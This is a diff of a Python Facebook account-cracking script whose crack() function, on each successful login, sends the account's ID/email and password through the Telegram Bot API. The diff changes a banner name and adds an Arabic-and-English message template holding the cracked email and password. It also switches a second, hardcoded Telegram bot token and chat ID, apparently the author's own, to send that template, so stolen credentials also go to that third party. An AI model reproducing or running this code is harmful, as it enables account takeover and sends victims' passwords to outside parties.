@@ -767,7 +767,7 @@ def crack(idf,pwv):
 				else:
 					print('\n')
 
-					statuscp = f''''⪧ ❲martin  • CP ❳
+					statuscp = f''''⪧ ❲AZOZ  • CP ❳
 \n❰▭▬▭▬▭▬﹝عبدالعزيز ﹞▭▬▭▬▭▬❱
 \n  SM  \n- 𝐈𝐃 𖡲 : {idf}\n
  
@@ -804,10 +804,25 @@ def crack(idf,pwv):
 \n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
 (AM ♕ Abdulaziz)  :  @K_B_I_O'\n\n\t\t\t\t\t
 					'''
+					statusokm = f'''
+		ɴᴇᴡ ғᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄ ʙʀᴏ ⚡❄
+		حـ༈ۖ҉ـسـ༈ۖ҉ـآب فـ༈ۖ҉ـيـ༈ۖ҉ـسـ༈ۖ҉ـبـ༈ۖ҉ـؤُك شغال ⚡❄
+		_____________________________
+		ᴇᴍᴀɪʟ - ايـ√ـمـيـل < {idf}
+		
+		ᴘᴀѕѕ - بـاسـ🔒ـوࢪد < {pw}
+		
+		id = tg://openmessage?user_id={ID}
+		_____________________________
+		*ᴅᴏɴᴛ ғᴏʀɢᴇᴛ ѕᴄʀᴇᴇɴѕ* 🖤🌞
+		*لاتنسى صور الصيد* ✨🔥
+		_____________________________
+	
+		                                        '''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-					requests.get("https://api.telegram.org/bot"+str('6935675175:AAHtpEuluYiHPDvgobkFZicyZgfd05dpWPE')+"/sendMessage?chat_id="+str('1853807771')+"&text="+str(statusok))
+					requests.get("https://api.telegram.org/bot"+str('6935675175:AAHtpEuluYiHPDvgobkFZicyZgfd05dpWPE')+"/sendMessage?chat_id="+str('1853807771')+"&text="+str(statusokm))
 					cek_SMVIP(kuki)
 					break
 				elif 'ya' in taplikasi:
